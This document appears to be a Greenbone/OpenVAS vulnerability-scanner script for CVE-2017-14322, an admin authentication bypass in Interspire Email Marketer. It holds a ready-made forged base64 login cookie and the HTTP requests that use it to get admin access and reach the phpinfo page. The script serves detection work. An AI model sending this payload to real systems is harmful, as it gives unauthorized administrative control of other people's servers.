CPE = "cpe:/a:interspire:iem";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.112087" );
	script_version( "2021-09-16T13:01:47+0000" );
	script_tag( name: "last_modification", value: "2021-09-16 13:01:47 +0000 (Thu, 16 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-10-19 08:54:12 +0200 (Thu, 19 Oct 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-05-10 17:49:00 +0000 (Fri, 10 May 2019)" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_cve_id( "CVE-2017-14322" );
	script_name( "Interspire IEM Remote Authentication Admin Bypass Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_interspire_iem_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "interspire/iem/installed" );
	script_tag( name: "summary", value: "Interspire Email Marketer (IEM) is prone to a remote authentication admin bypass vulnerability." );
	script_tag( name: "vuldetect", value: "This script sends a specially crafted cookie to the web-server that IEM is running to bypass the admin authentication." );
	script_tag( name: "insight", value: "The application creates a login cookie to determine and verify the user/admin.

  A weak consideration of the type during the confirmation of the cookie's parameters causes the application to grant access to an attacker who forged this specific cookie parameter
  by replacing the randomly generated string with just a boolean value ('true')." );
	script_tag( name: "impact", value: "Successfully exploiting the vulnerability will grant the attack full administration access to the IEM services on the host system." );
	script_tag( name: "affected", value: "IEM before version 6.1.6" );
	script_tag( name: "solution", value: "Upgrade to IEM version 6.1.6 to fix the issue." );
	script_xref( name: "URL", value: "https://security.infoteam.ch/en/blog/posts/narrative-of-an-incident-response-from-compromise-to-the-publication-of-the-weakness.html" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2017/Oct/39" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/admin/index.php?Page=&Action=Login";
cookie = "IEM_CookieLogin=YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE3MTA0NzcyOTQ7czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30=";
data = "ss_username=admin&ss_password=admin&ss_takemeto=index.php&SubmitButton=Login";
req = http_post_put_req( port: port, url: url, data: data, add_headers: make_array( "Cookie", cookie ), accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "HTTP/1\\.. 200 OK" ) && ( ContainsString( res, "admin/index.php?Page=Addons&Addon=dbcheck\"" ) || ContainsString( res, "admin/index.php?Page=Addons&Addon=checkpermissions" ) ) && ( ContainsString( res, "<div class=\"loggedinas\">" ) || ContainsString( res, "<a href=\"index.php?Page=Logout\"" ) )){
	url = dir + "/admin/index.php?Page=Settings&Action=showinfo";
	req = http_get_req( port: port, url: url, add_headers: make_array( "Cookie", cookie ), accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );
	res = http_keepalive_send_recv( port: port, data: req );
	if(IsMatchRegexp( res, "HTTP/1\\.. 200 OK" ) && ( ( ContainsString( res, "System" ) && ContainsString( res, "Build Date" ) ) || ContainsString( res, "<title>phpinfo()</title>" ) || ContainsString( res, "<h1>Configuration</h1>" ) || ( ContainsString( res, "SERVER_ADMIN" ) && ContainsString( res, "SERVER_ADDR" ) ) )){
		report = "It was possible to bypass the admin authentication and get unrestricted access to the Interspire Email Marketer system.";
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

